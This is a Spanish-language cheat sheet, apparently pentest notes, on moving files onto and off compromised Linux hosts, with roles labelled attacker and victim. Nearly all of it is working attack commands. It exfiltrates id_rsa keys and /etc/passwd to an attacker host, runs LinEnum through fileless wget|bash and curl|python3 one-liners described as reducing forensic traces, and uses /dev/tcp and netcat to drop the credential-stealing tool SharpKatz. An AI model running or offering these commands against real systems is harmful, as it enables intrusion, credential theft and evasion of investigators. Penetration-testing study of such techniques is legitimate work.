---
title: "Transferencia de Archivos en Linux"
pubDate: '2026-08-26'
---

Guía exhaustiva de técnicas, utilidades nativas y métodos fileless para transferir y exfiltrar archivos en sistemas Linux y entornos tipo Unix.

---

## 📋 1. Codificación en Base64 (Sin Conexión de Red)

Ideal cuando no hay conectividad de red directa pero se dispone de una terminal interactiva o consola donde pegar texto:

```bash
# 1. ATACANTE: Comprobar hash y generar cadena Base64 en una sola línea
md5sum id_rsa
cat id_rsa | base64 -w 0; echo

# 2. VÍCTIMA: Decodificar y escribir el archivo en disco
echo -n '<CADENA_BASE64>' | base64 -d > id_rsa

# 3. VÍCTIMA: Verificar integridad mediante MD5
md5sum id_rsa
```

---

## 🌐 2. Descargas con `wget` y `curl`

### Descarga a Disco
```bash
# Con wget
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

# Con cURL
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Ejecución Directa en Memoria (Fileless)
Ejecuta el script directamente sin escribirlo en el disco del objetivo (reduce trazas forenses):
```bash
# Descargar e interpretar directamente con Bash
wget -qO- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# Descargar e interpretar directamente con Python
curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/exploit.py | python3
```

---

## 🔐 3. Transferencias mediante SSH / SCP

```bash
# Descargar archivo desde el atacante hacia la víctima
scp atacante_user@192.168.49.128:/tmp/file.txt .

# Exfiltrar archivo de la víctima hacia el atacante
scp /etc/passwd atacante_user@192.168.49.128:/tmp/victim_passwd
```

---

## 🪚 4. Descarga Nativa con Bash y Descriptores (`/dev/tcp`)

A partir de Bash 2.04+, es posible transferir archivos sin `curl` ni `wget` abriendo un descriptor de socket TCP directo:

```bash
# 1. VÍCTIMA: Abrir descriptor de archivo de lectura/escritura (nº 3) hacia el puerto 80 del atacante
exec 3<>/dev/tcp/10.10.10.32/80

# 2. VÍCTIMA: Inyectar la petición HTTP GET en el descriptor
echo -e "GET /LinEnum.sh HTTP/1.1\r\nHost: 10.10.10.32\r\nConnection: close\r\n\r\n" >&3

# 3. VÍCTIMA: Leer la respuesta del buffer y volcar al archivo local
cat <&3 > /tmp/LinEnum.sh
```

---

## 🔌 5. Transferencias mediante Netcat / Ncat

### Opción A: Víctima en Escucha (Bind Mode)
```bash
# 1. VÍCTIMA: Escuchar en un puerto y redirigir entrada a un archivo
nc -l -p 8000 > SharpKatz.exe
# Con ncat: ncat -l -p 8000 --recv-only > SharpKatz.exe

# 2. ATACANTE: Conectar y enviar el archivo (cerrando conexión al terminar con -q 0)
nc -q 0 <IP_VICTIMA> 8000 < SharpKatz.exe
# Con ncat: ncat --send-only <IP_VICTIMA> 8000 < SharpKatz.exe
```

### Opción B: Atacante en Escucha (Reverse Mode)
```bash
# 1. ATACANTE: Ponerse en escucha enviando el archivo
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# Con ncat: sudo ncat -l -p 443 --send-only < SharpKatz.exe

# 2. VÍCTIMA: Conectarse para recibir el archivo
nc <IP_ATACANTE> 443 > SharpKatz.exe

# 3. VÍCTIMA alternativa con /dev/tcp si no hay netcat:
cat < /dev/tcp/<IP_ATACANTE>/443 > SharpKatz.exe
```

---

## 🐍 6. One-Liners en Lenguajes de Scripting

### Python
```bash
# Python 2
python2.7 -c 'import urllib; urllib.urlretrieve("http://10.10.10.32/LinEnum.sh", "LinEnum.sh")'

# Python 3
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.10.10.32/LinEnum.sh", "LinEnum.sh")'
```

### PHP
```bash
# Guardar en disco vía file_get_contents
php -r '$file = file_get_contents("http://10.10.10.32/LinEnum.sh"); file_put_contents("LinEnum.sh", $file);'

# Guardar en disco vía stream chunks (fopen)
php -r 'const BUFFER = 1024; $fremote = fopen("http://10.10.10.32/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Ejecución Fileless con PHP
php -r '$lines = @file("http://10.10.10.32/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### Ruby y Perl
```bash
# Ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("http://10.10.10.32/LinEnum.sh")))'

# Perl
perl -e 'use LWP::Simple; getstore("http://10.10.10.32/LinEnum.sh", "LinEnum.sh");'
```
